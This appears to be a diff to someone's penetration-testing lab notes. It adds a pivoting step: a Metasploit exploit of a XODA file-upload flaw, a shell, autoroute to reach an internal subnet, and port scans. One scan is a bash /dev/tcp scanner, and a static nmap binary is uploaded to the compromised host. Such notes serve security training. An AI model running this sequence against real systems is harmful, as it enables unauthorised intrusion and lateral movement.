@@ -856,10 +856,36 @@ db_import /root/windows_server_2012
 hosts
 services
 ```
-49)
+49)  T1046 : Network Service Scanning   **PIVOTING**
 
 ```
-
+ip addr
+nmap 192.120.121.3
+curl 192.120.121.3
+msfconsole
+use exploit/unix/webapp/xoda_file_upload
+set RHOSTS 192.120.121.3
+set TARGETURI /
+exploit
+shell
+ip addr
+run autoroute -s 192.125.162.2
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.125.162.3
+set verbose true
+set ports 1-1000
+exploit
+ls -l /root/tools/static-binaries
+#!/bin/bash
+for port in {1..1000}; do
+timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
+done
+upload /root/tools/static-binaries/nmap /tmp/nmap
+upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
+cd /tmp/
+chmod +x ./nmap ./bash-port-scanner.sh
+./bash-port-scanner.sh 192.125.162.3
+./nmap -p- 192.125.162.3
 ```
 
 
